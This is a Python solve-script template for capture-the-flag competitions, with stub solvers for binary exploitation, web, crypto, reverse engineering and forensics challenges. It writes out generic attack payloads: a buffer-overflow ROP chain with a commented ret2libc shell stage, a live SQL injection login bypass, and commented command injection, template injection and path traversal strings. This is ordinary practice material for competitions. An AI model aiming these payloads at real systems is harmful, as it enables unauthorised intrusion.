#!/usr/bin/env python3
"""
CTF Solve Script Template

Challenge: [Challenge Name]
Event:     [CTF Event / Year]
Category:  [Web / Pwn / RE / Crypto / Forensics]
Points:    [Points]
Author:    [Your Name]

Description:
    [Brief description of the challenge and solution approach.]

Usage:
    python3 solve-template.py [--remote] [--debug]

Dependencies:
    pip install pwntools requests
"""

import argparse
import logging
import sys

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# Remote target
REMOTE_HOST = "challenge.ctf.com"
REMOTE_PORT = 1337

# Local target (for testing)
LOCAL_HOST = "127.0.0.1"
LOCAL_PORT = 1337

# Web challenge target
WEB_URL = "http://challenge.ctf.com:8080"

# Known values
FLAG_FORMAT = r"flag\{.*?\}"

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] %(message)s",
)
log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# PWN category solve (binary exploitation)
# ---------------------------------------------------------------------------

def solve_pwn(remote=False, debug=False):
    """
    Solve a binary exploitation challenge.
    Uses pwntools for interaction.
    """
    from pwn import (
        process, remote as pwn_remote, context,
        ELF, ROP, p64, u64, flat, cyclic, cyclic_find,
        asm, shellcraft, log as pwnlog,
    )

    # Set architecture context
    context.binary = elf = ELF("./challenge")
    context.terminal = ["tmux", "splitw", "-h"]

    if debug:
        context.log_level = "debug"

    # Connect to target
    if remote:
        io = pwn_remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(elf.path)

    # Useful addresses
    log.info("Binary base (PIE disabled): 0x%x", elf.address)
    log.info("puts@plt: 0x%x", elf.plt.get("puts", 0))
    log.info("puts@got: 0x%x", elf.got.get("puts", 0))

    # --- Exploit logic starts here ---

    # Example: Buffer overflow with ROP
    # Step 1: Find offset to return address
    offset = 72  # Found via cyclic pattern or manual analysis

    # Step 2: Build ROP chain
    rop = ROP(elf)

    # Example: ret2libc leak
    # rop.call("puts", [elf.got["puts"]])
    # rop.call(elf.symbols["main"])

    # Step 3: Build payload
    payload = flat(
        b"A" * offset,
        rop.chain(),
    )

    # Step 4: Send payload
    io.recvuntil(b"Input: ")
    io.sendline(payload)

    # Step 5: Parse response / get flag
    result = io.recvline()
    log.info("Received: %s", result)

    # Example: Leak libc address
    # leaked = u64(result[:6].ljust(8, b"\x00"))
    # log.info("Leaked puts: 0x%x", leaked)

    # Step 6: Second stage (if needed)
    # libc = ELF("./libc.so.6")
    # libc.address = leaked - libc.symbols["puts"]
    # rop2 = ROP(libc)
    # rop2.call("system", [next(libc.search(b"/bin/sh\x00"))])

    # Get flag
    io.interactive()


# ---------------------------------------------------------------------------
# WEB category solve
# ---------------------------------------------------------------------------

def solve_web(debug=False):
    """
    Solve a web exploitation challenge.
    Uses requests for HTTP interaction.
    """
    import requests
    import re

    session = requests.Session()

    if debug:
        logging.getLogger().setLevel(logging.DEBUG)

    # Step 1: Reconnaissance
    log.info("Targeting: %s", WEB_URL)
    resp = session.get(WEB_URL)
    log.info("Status: %d, Length: %d", resp.status_code, len(resp.text))

    # Step 2: Exploit
    # Example: SQL Injection
    payload = "' OR 1=1-- -"
    data = {
        "username": payload,
        "password": "anything",
    }
    resp = session.post(f"{WEB_URL}/login", data=data)

    # Example: SSTI
    # payload = "{{config.items()}}"
    # resp = session.get(f"{WEB_URL}/search?q={payload}")

    # Example: Command Injection
    # payload = "; cat /flag.txt"
    # resp = session.post(f"{WEB_URL}/ping", data={"host": payload})

    # Example: Path Traversal
    # payload = "....//....//....//etc/passwd"
    # resp = session.get(f"{WEB_URL}/download?file={payload}")

    # Step 3: Extract flag
    flag_match = re.search(FLAG_FORMAT, resp.text)
    if flag_match:
        flag = flag_match.group(0)
        log.info("FLAG: %s", flag)
        return flag

    log.warning("Flag not found in response")
    log.debug("Response body:\n%s", resp.text[:500])
    return None


# ---------------------------------------------------------------------------
# CRYPTO category solve
# ---------------------------------------------------------------------------

def solve_crypto(debug=False):
    """
    Solve a cryptography challenge.
    """
    from Crypto.Util.number import long_to_bytes, bytes_to_long, inverse, GCD
    import base64

    # Example: RSA with small exponent
    n = 0  # Modulus
    e = 3  # Public exponent
    c = 0  # Ciphertext

    # Small e attack (if m^e < n)
    # from gmpy2 import iroot
    # m, exact = iroot(c, e)
    # if exact:
    #     flag = long_to_bytes(int(m))
    #     log.info("FLAG: %s", flag.decode())

    # Example: XOR with known plaintext
    # ciphertext = bytes.fromhex("deadbeef...")
    # known = b"flag{"
    # key_fragment = bytes(a ^ b for a, b in zip(ciphertext, known))
    # log.info("Key fragment: %s", key_fragment.hex())

    # Example: Caesar / ROT cipher
    # ciphertext = "encrypted_text_here"
    # for shift in range(26):
    #     plaintext = "".join(
    #         chr((ord(c) - ord('a') - shift) % 26 + ord('a'))
    #         if c.isalpha() else c
    #         for c in ciphertext.lower()
    #     )
    #     if "flag" in plaintext:
    #         log.info("Shift %d: %s", shift, plaintext)

    # Example: Base64 decode chain
    # data = "encoded_string"
    # while True:
    #     try:
    #         data = base64.b64decode(data).decode()
    #         log.info("Decoded: %s", data[:50])
    #     except Exception:
    #         break
    # log.info("Final: %s", data)

    log.info("Crypto solve completed")


# ---------------------------------------------------------------------------
# RE (Reverse Engineering) category solve
# ---------------------------------------------------------------------------

def solve_re(debug=False):
    """
    Solve a reverse engineering challenge.
    """
    import struct
    import re

    # Example: Extract and decode hardcoded flag
    with open("./challenge", "rb") as f:
        binary = f.read()

    # Search for flag pattern in binary
    flag_match = re.search(FLAG_FORMAT.encode(), binary)
    if flag_match:
        log.info("FLAG found in binary: %s", flag_match.group(0).decode())
        return

    # Example: Reverse a transformation
    # encoded = [0x66, 0x6d, 0x63, 0x68, 0x7f, ...]  # from binary analysis
    # decoded = bytes(b ^ 0x07 for b in encoded)
    # log.info("Decoded: %s", decoded.decode())

    # Example: Solve a constraint (like a keygen)
    # target = [expected values from binary analysis]
    # flag = ""
    # for t in target:
    #     for c in range(32, 127):
    #         if transform(c) == t:
    #             flag += chr(c)
    #             break
    # log.info("FLAG: flag{%s}", flag)

    # Example: Z3 constraint solver
    # from z3 import Solver, BitVec, sat
    # s = Solver()
    # chars = [BitVec(f"c{i}", 8) for i in range(flag_length)]
    # for c in chars:
    #     s.add(c >= 0x20, c <= 0x7e)
    # # Add constraints from binary analysis
    # # s.add(chars[0] + chars[1] == 0xAB)
    # if s.check() == sat:
    #     m = s.model()
    #     flag = "".join(chr(m[c].as_long()) for c in chars)
    #     log.info("FLAG: %s", flag)

    log.info("RE solve completed")


# ---------------------------------------------------------------------------
# FORENSICS category solve
# ---------------------------------------------------------------------------

def solve_forensics(debug=False):
    """
    Solve a forensics challenge.
    """
    import re

    # Example: Extract data from a file
    with open("./evidence.bin", "rb") as f:
        data = f.read()

    # Search for flag
    flag_match = re.search(FLAG_FORMAT.encode(), data)
    if flag_match:
        log.info("FLAG: %s", flag_match.group(0).decode())
        return

    # Example: Extract from steganography (LSB)
    # from PIL import Image
    # img = Image.open("image.png")
    # pixels = list(img.getdata())
    # bits = "".join(str(p[0] & 1) for p in pixels)
    # message = "".join(
    #     chr(int(bits[i:i+8], 2))
    #     for i in range(0, len(bits), 8)
    # )
    # log.info("Hidden message: %s", message[:100])

    # Example: Analyze PCAP
    # from scapy.all import rdpcap, TCP
    # packets = rdpcap("capture.pcap")
    # for pkt in packets:
    #     if pkt.haslayer(TCP) and pkt[TCP].dport == 80:
    #         payload = bytes(pkt[TCP].payload)
    #         if b"flag" in payload:
    #             log.info("Found: %s", payload)

    # Example: Recover deleted file from disk image
    # with open("disk.img", "rb") as f:
    #     data = f.read()
    # # Find file signatures
    # png_header = b"\x89PNG\r\n\x1a\n"
    # offset = data.find(png_header)
    # if offset != -1:
    #     log.info("PNG found at offset 0x%x", offset)

    log.info("Forensics solve completed")


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description="CTF Solve Script -- [Challenge Name]",
    )
    parser.add_argument(
        "--remote", "-r",
        action="store_true",
        help="Connect to remote target instead of local",
    )
    parser.add_argument(
        "--debug", "-d",
        action="store_true",
        help="Enable debug output",
    )
    parser.add_argument(
        "--category", "-c",
        choices=["pwn", "web", "crypto", "re", "forensics"],
        default="pwn",
        help="Challenge category (determines solve function)",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    args = parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    log.info("=== CTF Solve: [Challenge Name] ===")

    solvers = {
        "pwn": lambda: solve_pwn(remote=args.remote, debug=args.debug),
        "web": lambda: solve_web(debug=args.debug),
        "crypto": lambda: solve_crypto(debug=args.debug),
        "re": lambda: solve_re(debug=args.debug),
        "forensics": lambda: solve_forensics(debug=args.debug),
    }

    solver = solvers.get(args.category)
    if solver:
        try:
            solver()
        except KeyboardInterrupt:
            log.info("Interrupted by user")
        except Exception as e:
            log.error("Solve failed: %s", e)
            if args.debug:
                import traceback
                traceback.print_exc()
            sys.exit(1)
    else:
        log.error("Unknown category: %s", args.category)
        sys.exit(1)


if __name__ == "__main__":
    main()
